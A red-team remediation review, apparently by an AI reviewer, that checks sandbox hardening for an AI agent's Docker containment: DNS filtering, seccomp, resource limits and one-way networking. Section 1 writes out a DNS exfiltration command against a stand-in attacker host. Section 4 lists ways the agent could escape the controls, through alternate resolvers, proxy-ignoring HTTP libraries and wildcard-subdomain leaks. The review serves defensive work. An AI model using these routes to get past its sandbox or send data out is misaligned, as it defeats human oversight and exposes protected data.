

# REAL_RED_TEAM_ROUND_2_FINDINGS.md

**Date:** 2026-02-15
**Reviewer:** Claude Opus 4.6 (Red Team Round 2 — Remediation Verification)
**Scope:** Validate P0/P1 fixes applied to Defense Strategy, Interface Spec, and Implementation Plan against Round 1 Consolidated Findings
**Classification:** Protocol 128, Phase IV, Gate 2

---

## Executive Summary

The Sanctum team has responded to the Round 1 multi-model consensus (4/4 reviewers flagged 3 critical classes) by updating `defense_in_depth_strategy.md`, `openclaw_interface_spec.md`, and `implementation_plan.md`. The remediation effort is **substantive and directionally correct** — these are not cosmetic patches. However, several fixes remain at the "stated intent" level rather than "verified configuration" level, leaving residual risk in two areas.

**Verdict on Remediation Plan: STRONG (with caveats)**

---

## 1. DNS Filtering Effectiveness

### What Was Fixed
- `defense_in_depth_strategy.md` Layer 2 now explicitly includes a **CoreDNS sidecar** as the DNS filtering mechanism.
- `implementation_plan.md` Phase 1.2 adds: "Deploy `coredns` sidecar on `control-net`. Configure Agent to use it as sole resolver. Block all non-whitelisted domains."

### Verification Assessment

| Control | Status | Residual Risk |
|:--------|:-------|:--------------|
| CoreDNS sidecar deployed | **REMEDIATED (Design)** | None if implemented correctly |
| Agent uses sidecar as sole resolver | **REMEDIATED (Design)** | Requires `dns:` override in docker-compose AND blocking alternative resolvers |
| Block UDP/53 outbound from agent | **NOT EXPLICITLY STATED** | **MEDIUM** — The implementation plan says "Block all non-whitelisted domains" but does not specify the firewall rule blocking raw UDP/53 to bypass the sidecar |

### Critical Question: Can the Agent Force a Different Resolver?

If the agent runs `dig @8.8.8.8 secret.attacker.com` (specifying an upstream resolver directly), the CoreDNS sidecar is bypassed entirely. The fix requires **two controls**:

1. CoreDNS as configured resolver (present in plan)
2. **iptables/nftables rule dropping all UDP/53 and TCP/53 from the agent container except to the CoreDNS sidecar IP** (implied but not explicitly specified)

The `defense_in_depth_strategy.md` Layer 2 table says "Blocks non-whitelisted domains" but the enforcement mechanism is listed as "dedicated `coredns` container" — this only works if the network-level block is also present.

**Verdict: 85% remediated.** Add an explicit firewall rule (`iptables -A OUTPUT -p udp --dport 53 -d ! <coredns_ip> -j DROP`) to the implementation plan Phase 1.2 or Phase 2.4 to close this gap completely.

---

## 2. Host Hardening (pids-limit, seccomp)

### What Was Fixed
- `defense_in_depth_strategy.md` Layer 1 now includes: `pids_limit: 100`, `ulimits: { nofile: 1024 }`, `cap_drop: [ALL]`.
- `implementation_plan.md` Phase 1.3 now includes: `pids_limit: 100`, `mem_limit: 512m`, `cpus: 1.0`, `ulimits: nofile: { soft: 1024, hard: 2048 }`.
- `implementation_plan.md` Phase 1.3 adds: "Seccomp: Apply custom profile `docker/seccomp/agent-profile.json` (block `ptrace`, `mount`, `bpf`)."
- `openclaw_interface_spec.md` Section 4.1 adds: `cap_drop: [ALL]`, `pids_limit: 100`, `seccomp: agent-profile.json`.

### Verification Assessment

| Control | Status | Residual Risk |
|:--------|:-------|:--------------|
| `pids_limit: 100` | **REMEDIATED** | Fork bomb contained. 100 is reasonable for Node.js agent. |
| `cap_drop: [ALL]` | **REMEDIATED** | Eliminates capability-based escapes |
| `mem_limit: 512m` | **REMEDIATED** | Memory bomb contained |
| `cpus: 1.0` | **REMEDIATED** | CPU exhaustion contained |
| `ulimits: nofile` | **REMEDIATED** | FD exhaustion contained |
| Custom seccomp profile | **PARTIALLY REMEDIATED** | Profile is *referenced* but the actual JSON file `docker/seccomp/agent-profile.json` does not exist yet. The syscalls to block are listed (`ptrace`, `mount`, `bpf`) but not the full profile. |
| `--security-opt=no-new-privileges` | **MISSING** | **LOW-MEDIUM** — Not mentioned in any document. This prevents setuid binaries from gaining privileges. Should be added. |
| `/tmp` and `/dev/shm` `noexec` | **REMEDIATED** | Implementation plan Phase 1.3: "Mount `/tmp` and `/dev/shm` with `noexec,nosuid,nodev`." Interface spec confirms. |

### Notable Gap: `no-new-privileges`

Round 1 (GPT-5) explicitly recommended `--security-opt=no-new-privileges`. This was not incorporated. While `cap_drop: [ALL]` covers most scenarios, `no-new-privileges` is a defense-in-depth control that costs nothing and prevents setuid escalation even if a setuid binary somehow appears in a writable mount.

**Verdict: 90% remediated.** Add `no-new-privileges` and ensure the seccomp JSON file is actually created before build.

---

## 3. Network Isolation (Lateral Movement)

### What Was Fixed
- `defense_in_depth_strategy.md` Layer 2 now includes: "Unidirectional Firewall: `iptables` rule: `Agent -> Scout` ALLOWED. `Scout -> Agent` DENIED."
- `implementation_plan.md` Phase 1.2 adds: "Enforce unidirectional traffic `Agent -> Scout` using internal firewall rules. Deny `Scout -> Agent`."

### Verification Assessment

| Control | Status | Residual Risk |
|:--------|:-------|:--------------|
| Unidirectional rule stated | **REMEDIATED (Design)** | None if implemented |
| Enforcement mechanism specified | **PARTIALLY REMEDIATED** | "internal firewall rules" is vague — is this `iptables` inside a container, Docker network policy, or a host-level rule? |
| Verification step | **REMEDIATED** | Round 1 (Claude) recommended `nmap` scan from Scout; this should be in Phase 5.2 |

### Residual Risk: Docker Network Limitations

Docker's built-in networking does not natively support unidirectional traffic between containers on the same network. The options are:

1. **iptables on the host** filtering Docker bridge traffic (fragile, depends on Docker's internal IP assignment)
2. **Separate networks** where Scout has no route to Agent (cleanest solution)
3. **Network policy plugins** (Calico/Cilium — overkill for single-host)

The implementation plan says "internal firewall rules" without specifying which approach. The cleanest solution is: put Scout on `execution-net` ONLY, put Agent on both `control-net` and `execution-net`, and ensure Scout's network has no route back to anything on `control-net`. But if Agent listens on any port on `execution-net`, Scout can still reach it there.

**Verdict: 75% remediated.** The intent is clear but the mechanism needs specification. Recommend either (a) explicit iptables rules in a startup script, or (b) two separate one-way networks with Agent initiating connections to Scout via a known port.

---

## 4. New Bypass Vectors (Post-Remediation)

### BYPASS-01: Squid CONNECT Mode — Node.js Library Compliance

The implementation plan (Phase 2.3) now specifies explicit proxy mode with `HTTP_PROXY`/`HTTPS_PROXY` environment variables and Squid `CONNECT` ACLs. This is correct.

**However:** Not all Node.js HTTP libraries respect `HTTP_PROXY`. Specifically:
- `node-fetch` v2: Does NOT respect proxy env vars natively (requires `https-proxy-agent`)
- `undici` (Node.js built-in fetch): Requires explicit dispatcher configuration
- Native `https.request`: Does NOT respect env vars without manual agent injection

If OpenClaw uses any library that bypasses proxy settings, traffic goes direct — and if the network-level firewall doesn't block direct outbound, the proxy is circumvented.

**Mitigation:** The network-level block (iptables dropping all outbound except to Squid IP) is the real enforcement. Ensure this rule exists. The proxy env vars are a convenience, not the security control.

### BYPASS-02: CoreDNS Over-Trust

If CoreDNS is configured to forward whitelisted domains to an upstream resolver (e.g., 8.8.8.8), and the agent can make requests to a whitelisted domain that the attacker also controls a subdomain of, data can be exfiltrated via legitimate-looking queries. Example: if `*.github.com` is whitelisted, `secret-data.evil-user.github.io` resolves via the same path.

**Mitigation:** Whitelist specific FQDNs, not wildcard domains. Use `api.anthropic.com` not `.anthropic.com`. This is already implied but should be made explicit in the CoreDNS configuration.

---

## 5. Summary Scorecard

| Round 1 Finding | Severity | Remediation Status | Residual Risk |
|:----------------|:---------|:-------------------|:--------------|
| DNS Tunneling (CRIT-01) | Critical | **85%** — CoreDNS added, UDP/53 block implied but not explicit | Low-Medium |
| seccomp Missing (CRIT-02) | Critical | **90%** — Referenced in plan, file not yet created | Low |
| Squid HTTPS (CRIT-03) | Critical | **95%** — Explicit proxy mode + CONNECT ACLs specified | Low |
| Lateral Movement (HIGH-01) | High | **75%** — Intent clear, mechanism unspecified | Medium |
| `/tmp` noexec (HIGH-02) | High | **100%** — Fully specified | None |
| `pids_limit` (HIGH-03*) | High | **100%** — Fully specified | None |
| `cap_drop: ALL` | High | **100%** — Fully specified | None |

*HIGH-03 was rate limiting on Guard — not addressed in these updates but is a P1, not P0.

---

## Final Go/No-Go Decision

### **GO — Conditional Safe to Build**

The three Critical findings from Round 1 have been substantively addressed. The architecture has moved from "NOT safe to build" to "Safe to build with implementation verification." The remaining gaps are:

1. **Must-do before first run:** Create the actual `agent-profile.json` seccomp file. Add explicit `iptables` rule for UDP/53 blocking. Specify the unidirectional network enforcement mechanism.
2. **Must-do before first autonomous run:** Add `no-new-privileges`. Verify Node.js proxy compliance. Use FQDN-specific (not wildcard) DNS whitelisting.
3. **Accepted risk:** Standard Docker isolation (not gVisor/Kata) is acceptable for development/prototyping. Mandate microVM for production per Grok's recommendation.

The Sanctum team has demonstrated serious engagement with the Red Team findings. The remediation is not theatrical — real configuration changes were made to the right documents. **Proceed to implementation.**

---

*End of Red Team Round 2 Review*
*Reviewer: Claude Opus 4.6*
*Protocol 128, Phase IV, Gate 2 — Remediation Verification*
